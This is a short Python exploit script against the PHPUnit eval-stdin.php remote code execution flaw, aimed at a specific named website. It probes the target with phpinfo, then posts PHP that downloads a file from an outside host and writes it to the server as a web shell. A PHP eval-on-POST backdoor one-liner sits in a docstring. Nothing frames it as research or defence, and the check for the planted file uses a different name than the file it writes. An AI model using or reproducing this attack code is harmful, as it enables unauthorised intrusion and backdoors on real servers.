# coding:utf-8

import requests
import re

'''
<O>
<?php eval($_POST[c]);?>
</O>
'''

class Exploit:

    def attack(self, url):
        param = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        post_data = "<?php phpinfo();"

        response = requests.post(url+param, data=post_data,timeout=5)
        if "phpinfo" in response.content:
            print "{} have exploit.".format(url)

        post_data = '<?php file_put_contents("test.php",file_get_contents("http://loid.online/test.txt"));'
        response = requests.post(url + param, data=post_data, timeout=5)
        if requests.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/test2.php').status_code == 200:
            return url+'/vendor/phpunit/phpunit/src/Util/PHP/test2.php'

print Exploit().attack('http://www.walhao.com/')